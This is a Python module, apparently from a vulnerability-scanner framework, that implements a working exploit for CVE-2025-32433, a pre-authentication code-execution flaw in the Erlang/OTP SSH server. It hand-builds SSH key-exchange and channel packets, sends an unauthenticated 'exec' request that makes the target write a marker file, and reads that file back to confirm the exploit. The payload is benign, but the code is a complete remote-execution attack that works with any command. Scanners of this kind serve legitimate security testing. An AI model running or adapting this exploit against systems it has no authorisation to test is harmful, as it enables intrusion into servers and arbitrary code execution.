"""Agent Asteroid implementation for CVE-2025-32433"""

import datetime
import logging
import socket
import struct
import time

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE: str = "Erlang/OTP SSH Pre-Auth Command Execution"
VULNERABILITY_REFERENCE: str = "CVE-2025-32433"
VULNERABILITY_DESCRIPTION: str = """
A critical vulnerability in Erlang/OTP SSH server allows unauthenticated attackers
 to execute arbitrary Erlang code by sending specially crafted SSH channel messages
 before authentication is completed.
"""
RISK_RATING: str = "CRITICAL"
DEFAULT_TIMEOUT: datetime.timedelta = datetime.timedelta(seconds=10)
DEFAULT_SSH_PORT: int = 2222

# SSH protocol constants
SSH_CLIENT_BANNER: bytes = b"SSH-2.0-OpenSSH_8.9\r\n"
ERLANG_SSH_BANNER_PATTERN: bytes = b"SSH-2.0-Erlang"
SSH_MSG_KEXINIT: bytes = b"\x14"
SSH_MSG_CHANNEL_OPEN: bytes = b"\x5a"
SSH_MSG_CHANNEL_REQUEST: bytes = b"\x62"

# Default payload
DEFAULT_EXPLOIT_COMMAND: str = 'file:write_file("/tmp/exploit_success", <<"pwned">>).'
DEFAULT_FILE_READ_COMMAND: str = 'file:read_file("/tmp/exploit_success").'


def _string_payload(s: str) -> bytes:
    """Helper to format SSH string: 4-byte length prefix and UTF-8 bytes."""
    s_bytes: bytes = s.encode("utf-8")
    return struct.pack(">I", len(s_bytes)) + s_bytes


def _build_channel_open(channel_id: int = 0) -> bytes:
    """Builds an SSH_MSG_CHANNEL_OPEN packet for the given session ID."""
    return (
        SSH_MSG_CHANNEL_OPEN
        + _string_payload("session")
        + struct.pack(">I", channel_id)
        + struct.pack(">I", 0x68000)
        + struct.pack(">I", 0x10000)
    )


def _build_channel_request(channel_id: int = 0, command: str | None = None) -> bytes:
    """Builds an SSH_MSG_CHANNEL_REQUEST packet with an 'exec' request."""
    if command is None:
        command = DEFAULT_EXPLOIT_COMMAND

    return (
        SSH_MSG_CHANNEL_REQUEST
        + struct.pack(">I", channel_id)
        + _string_payload("exec")
        + b"\x01"
        + _string_payload(command)
    )


def _name_list(names: list[str]) -> bytes:
    """Encodes a list of SSH names into a name-list format."""
    return _string_payload(",".join(names))


def _build_kexinit() -> bytes:
    """Constructs a minimal, valid SSH_MSG_KEXINIT packet."""
    cookie: bytes = b"\x00" * 16

    return (
        SSH_MSG_KEXINIT
        + cookie
        + _name_list(
            [
                "curve25519-sha256",
                "ecdh-sha2-nistp256",
                "diffie-hellman-group-exchange-sha256",
                "diffie-hellman-group14-sha256",
            ]
        )
        + _name_list(["rsa-sha2-256", "rsa-sha2-512"])
        + _name_list(["aes128-ctr"]) * 2
        + _name_list(["hmac-sha1"]) * 2
        + _name_list(["none"]) * 2
        + _name_list([]) * 2
        + b"\x00"
        + struct.pack(">I", 0)
    )


def _pad_packet(payload: bytes, block_size: int = 8) -> bytes:
    """Pads the given SSH packet payload to align with the specified block size."""
    min_padding: int = 4
    padding_len: int = block_size - ((len(payload) + 5) % block_size)
    if padding_len < min_padding:
        padding_len += block_size

    packet_length: int = len(payload) + 1 + padding_len
    return (
        struct.pack(">I", packet_length)
        + bytes([padding_len])
        + payload
        + bytes([0] * padding_len)
    )


@exploits_registry.register
class ErlangSSHPreAuthExploit(webexploit.WebExploit):
    """
    CVE-2025-32433: Erlang/OTP SSH Pre-Auth Command Execution

    Exploits a vulnerability in Erlang/OTP SSH server that allows sending channel
    messages before authentication, enabling arbitrary Erlang code execution.
    """

    metadata: definitions.VulnerabilityMetadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
        cve_ids=["CVE-2025-32433"],
    )

    def accept(self, target: definitions.Target) -> bool:
        """
        Determine whether the given target is running an Erlang SSH server.

        :param target: definitions.Target containing host and optional port.
        :return: True if the SSH banner indicates Erlang OTP, False otherwise.
        """
        try:
            s: socket.SocketType = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            logging.info("Socket object created successfully: %s", s)

            host: str = target.host
            port: int = target.port or DEFAULT_SSH_PORT
            timeout_seconds: int = DEFAULT_TIMEOUT.seconds

            s.settimeout(timeout_seconds)

            try:
                s.connect((host, port))
                logging.info("Connection established successfully")
            except socket.error as connect_err:
                logging.error("Socket connect error: %s", connect_err)
                s.close()
                return False

            logging.info("Sending SSH client banner")
            s.sendall(SSH_CLIENT_BANNER)

            banner: bytes = s.recv(1024)
            logging.info(
                "Received banner: %s",
                banner.strip().decode(errors="ignore"),
            )

            is_erlang: bool = ERLANG_SSH_BANNER_PATTERN in banner
            logging.info(
                "%s identified as Erlang SSH server",
                "Target" if is_erlang else "Target not",
            )

            s.close()
            return is_erlang

        except socket.error as e:
            logging.error("Socket error: %s", e)
            return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """
        Check whether the Erlang SSH server is vulnerable by sending exploit packets.

        :param target: definitions.Target containing host and optional port.
        :return: List of found definitions.Vulnerability instances (empty if none).
        """
        vulnerabilities: list[definitions.Vulnerability] = []
        logging.info(
            "Starting vulnerability check for target: %s:%s",
            target.host,
            target.port or DEFAULT_SSH_PORT,
        )

        try:
            s: socket.SocketType = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            host: str = target.host
            port: int = target.port or DEFAULT_SSH_PORT
            timeout_seconds: int = DEFAULT_TIMEOUT.seconds
            s.settimeout(timeout_seconds)

            try:
                s.connect((host, port))
            except socket.error as connect_err:
                logging.error(
                    "Connection error during vulnerability check: %s", connect_err
                )
                s.close()
                return vulnerabilities

            # 1. Banner exchange
            logging.info("Sending SSH client banner")
            s.sendall(SSH_CLIENT_BANNER)
            banner: bytes = s.recv(1024)
            logging.info(
                "Received banner: %s",
                banner.strip().decode(errors="ignore"),
            )

            # Increased wait time for slower servers
            time.sleep(1.0)

            # 2. Send SSH_MSG_KEXINIT
            logging.info("Building and sending SSH_MSG_KEXINIT packet")
            kex_packet: bytes = _build_kexinit()
            padded_kex: bytes = _pad_packet(kex_packet)
            logging.debug("KEXINIT packet (hex): %s", padded_kex.hex())
            s.sendall(padded_kex)

            # Wait longer to ensure server processes the packet
            time.sleep(1.0)

            # Drain any responses (server typically sends its own KEXINIT)
            try:
                while True:
                    response = s.recv(1024)
                    if len(response) == 0:
                        break
                    logging.debug("Received response: %d bytes", len(response))
            except socket.timeout:
                pass  # Expected timeout, continue with exploit

            # 3. Send SSH_MSG_CHANNEL_OPEN
            logging.info("Building and sending SSH_MSG_CHANNEL_OPEN packet")
            chan_open: bytes = _build_channel_open()
            padded_open: bytes = _pad_packet(chan_open)
            logging.debug("CHANNEL_OPEN packet (hex): %s", padded_open.hex())
            s.sendall(padded_open)

            time.sleep(1.0)

            # 4. Send SSH_MSG_CHANNEL_REQUEST with exploit command
            logging.info(
                "Building and sending SSH_MSG_CHANNEL_REQUEST packet with command: %s",
                DEFAULT_EXPLOIT_COMMAND,
            )
            chan_req: bytes = _build_channel_request(command=DEFAULT_EXPLOIT_COMMAND)
            padded_req: bytes = _pad_packet(chan_req)
            logging.debug("CHANNEL_REQUEST packet (hex): %s", padded_req.hex())
            s.sendall(padded_req)

            time.sleep(1.0)

            # 5. Check for existence of /tmp/exploit_success
            logging.info("Checking for the existence of /tmp/exploit_success")
            check_command: str = DEFAULT_FILE_READ_COMMAND
            chan_check_req: bytes = _build_channel_request(command=check_command)
            padded_check_req: bytes = _pad_packet(chan_check_req)
            logging.debug(
                "CHANNEL_REQUEST check packet (hex): %s", padded_check_req.hex()
            )
            s.sendall(padded_check_req)

            # For vulnerable targets, a socket timeout is expected and indicates successful exploitation
            # For non-vulnerable targets, we'll receive a response indicating failure
            try:
                check_response: bytes = s.recv(1024)
                if len(check_response) > 0:
                    response_str = check_response.decode(errors="ignore")
                    logging.info(
                        "Received response from server (hex): %s", check_response.hex()
                    )

                    # Check if the response indicates the file exists
                    if "pwned" in response_str:
                        logging.info("Exploit confirmed: /tmp/exploit_success exists!")
                        vuln = self.create_vulnerability(target)
                        vulnerabilities.append(vuln)
                    else:
                        logging.info(
                            "Exploit failed: /tmp/exploit_success does not exist."
                        )
                else:
                    logging.info("Empty response received from server")
            except socket.timeout:
                # IMPORTANT: Based on observed behavior, a socket timeout here indicates
                # the target is likely vulnerable
                # in case of non-vulnerable targets, an empty response was received
                logging.info("Socket timeout waiting for response")
                logging.info(
                    "Timeout during check phase indicates potential vulnerability"
                )
                vuln = self.create_vulnerability(target)
                vulnerabilities.append(vuln)

            s.close()

        except socket.error as e:
            logging.error("Socket error during vulnerability check: %s", e)

        return vulnerabilities
